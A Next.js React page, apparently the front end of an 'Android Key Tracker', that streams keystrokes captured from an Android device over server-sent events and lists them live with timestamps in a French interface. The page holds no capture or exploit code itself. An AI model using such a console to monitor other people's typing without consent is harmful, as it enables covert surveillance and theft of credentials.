'use client';

import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [keys, setKeys] = useState([]);
  const [isConnected, setIsConnected] = useState(false);
  const eventSourceRef = useRef(null);

  useEffect(() => {
    // Se connecter au stream SSE
    const eventSource = new EventSource('/api/stream');
    eventSourceRef.current = eventSource;

    eventSource.onopen = () => {
      setIsConnected(true);
    };

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === 'initial') {
          // Charger les touches existantes
          setKeys(data.keys || []);
        } else if (data.type === 'newKey') {
          // Ajouter la nouvelle touche
          setKeys(prevKeys => {
            const newKeys = [data.data, ...prevKeys];
            // Limiter à 1000 touches affichées
            return newKeys.slice(0, 1000);
          });
        }
      } catch (error) {
        console.error('Error parsing SSE data:', error);
      }
    };

    eventSource.onerror = () => {
      setIsConnected(false);
      // Réessayer la connexion après 3 secondes
      setTimeout(() => {
        if (eventSourceRef.current) {
          eventSourceRef.current.close();
          eventSourceRef.current = new EventSource('/api/stream');
        }
      }, 3000);
    };

    return () => {
      eventSource.close();
    };
  }, []);

  const formatTimestamp = (timestamp) => {
    const date = new Date(timestamp);
    return date.toLocaleTimeString('fr-FR', { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      fractionalSecondDigits: 3
    });
  };

  const clearKeys = () => {
    setKeys([]);
  };

  return (
    <main style={{
      minHeight: '100vh',
      padding: '20px',
      fontFamily: 'system-ui, -apple-system, sans-serif',
      backgroundColor: '#f5f5f5'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto',
        backgroundColor: 'white',
        borderRadius: '8px',
        padding: '20px',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <header style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          marginBottom: '20px',
          paddingBottom: '20px',
          borderBottom: '2px solid #e0e0e0'
        }}>
          <h1 style={{ margin: 0, color: '#333' }}>
            Android Key Tracker
          </h1>
          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              <div style={{
                width: '12px',
                height: '12px',
                borderRadius: '50%',
                backgroundColor: isConnected ? '#4caf50' : '#f44336',
                animation: isConnected ? 'pulse 2s infinite' : 'none'
              }} />
              <span style={{ fontSize: '14px', color: '#666' }}>
                {isConnected ? 'Connecté' : 'Déconnecté'}
              </span>
            </div>
            <button
              onClick={clearKeys}
              style={{
                padding: '8px 16px',
                backgroundColor: '#f44336',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                cursor: 'pointer',
                fontSize: '14px'
              }}
            >
              Effacer
            </button>
          </div>
        </header>

        <div style={{
          marginBottom: '10px',
          fontSize: '14px',
          color: '#666'
        }}>
          {keys.length} touche{keys.length > 1 ? 's' : ''} capturée{keys.length > 1 ? 's' : ''}
        </div>

        <div style={{
          maxHeight: '70vh',
          overflowY: 'auto',
          border: '1px solid #e0e0e0',
          borderRadius: '4px',
          backgroundColor: '#fafafa'
        }}>
          {keys.length === 0 ? (
            <div style={{
              padding: '40px',
              textAlign: 'center',
              color: '#999'
            }}>
              Aucune touche capturée. En attente de données...
            </div>
          ) : (
            <table style={{
              width: '100%',
              borderCollapse: 'collapse'
            }}>
              <thead>
                <tr style={{
                  backgroundColor: '#f0f0f0',
                  position: 'sticky',
                  top: 0,
                  zIndex: 1
                }}>
                  <th style={{
                    padding: '12px',
                    textAlign: 'left',
                    borderBottom: '2px solid #ddd',
                    fontSize: '12px',
                    fontWeight: '600',
                    color: '#666',
                    textTransform: 'uppercase'
                  }}>
                    Temps
                  </th>
                  <th style={{
                    padding: '12px',
                    textAlign: 'left',
                    borderBottom: '2px solid #ddd',
                    fontSize: '12px',
                    fontWeight: '600',
                    color: '#666',
                    textTransform: 'uppercase'
                  }}>
                    Touche
                  </th>
                </tr>
              </thead>
              <tbody>
                {keys.map((keyData, index) => (
                  <tr
                    key={keyData.id || index}
                    style={{
                      borderBottom: '1px solid #eee',
                      backgroundColor: index % 2 === 0 ? 'white' : '#fafafa'
                    }}
                  >
                    <td style={{
                      padding: '10px 12px',
                      fontSize: '13px',
                      color: '#666',
                      fontFamily: 'monospace'
                    }}>
                      {formatTimestamp(keyData.timestamp)}
                    </td>
                    <td style={{
                      padding: '10px 12px',
                      fontSize: '16px',
                      fontWeight: '500',
                      color: '#333'
                    }}>
                      {keyData.key === ' ' ? (
                        <span style={{ color: '#999' }}>[ESPACE]</span>
                      ) : keyData.key === '\n' ? (
                        <span style={{ color: '#999' }}>[ENTRÉE]</span>
                      ) : keyData.key === '\t' ? (
                        <span style={{ color: '#999' }}>[TAB]</span>
                      ) : (
                        keyData.key
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

      <style jsx>{`
        @keyframes pulse {
          0%, 100% {
            opacity: 1;
          }
          50% {
            opacity: 0.5;
          }
        }
      `}</style>
    </main>
  );
}
